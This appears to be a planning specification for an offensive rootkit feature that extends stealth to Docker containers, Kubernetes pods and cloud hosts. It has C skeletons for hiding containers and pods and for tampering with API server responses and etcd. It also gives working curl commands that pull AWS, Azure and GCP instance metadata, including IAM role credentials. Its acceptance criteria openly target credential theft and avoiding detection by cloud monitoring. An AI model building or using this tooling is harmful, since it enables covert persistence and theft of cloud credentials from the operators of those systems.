# F0227: Container & Cloud Rootkit

## Metadata
| Field | Value |
|---|---|
| ID | F0227 |
| Priority | Low |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0200, F0202, F0203 |

## Summary
Extend rootkit capabilities to containers and cloud environments including Docker, Kubernetes, and cloud metadata access.

## Docker Rootkit

### Container Hiding
```c
// Hook docker ps output
void hide_container(const char *container_id) {
    // Hide from /var/lib/docker/containers
    hide_from_docker_ls(container_id);

    // Hide from container inspection
    hook_container_inspect(container_id);

    // Hide network interfaces
    hide_container_network(container_id);
}
```

## Kubernetes Rootkit

### Pod Hiding
```c
// Intercept kubectl get pods
void hide_pod(const char *namespace, const char *pod_name) {
    // Hook API server response
    hook_k8s_api_list_pods(namespace, pod_name);

    // Hide from etcd
    hide_from_etcd("/registry/pods/" namespace "/" pod_name);
}
```

## Cloud Metadata Access

### AWS
```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Azure
```bash
curl -H "Metadata: true" http://169.254.169.254/metadata/instance/
```

### GCP
```bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/" \
  -H "Metadata-Flavor: Google"
```

## Stages

### Stage 1: Docker Rootkit
- [ ] Container hiding
- [ ] Namespace injection
- [ ] Network hiding

### Stage 2: Kubernetes Rootkit
- [ ] Pod hiding
- [ ] API server manipulation
- [ ] Service account theft

### Stage 3: Cloud Metadata
- [ ] AWS metadata extraction
- [ ] Azure metadata extraction
- [ ] GCP metadata extraction

## Feature Acceptance Criteria
- [ ] Containers hidden from docker ps
- [ ] Pods hidden from kubectl
- [ ] Cloud credentials extracted
- [ ] No detection by cloud monitoring

## Test Plan

### Unit Tests
- [ ] test_hide_container_from_ls
- [ ] test_extract_aws_metadata
- [ ] test_hide_pod_from_kubectl

### System Tests
- [ ] Run in Docker; verify container hidden
- [ ] Run in K8s; verify pod hidden
- [ ] Extract IAM role credentials

### Playwright Tests
- [ ] Configure container/cloud options
- [ ] View hidden containers/pods
- [ ] Extract cloud credentials
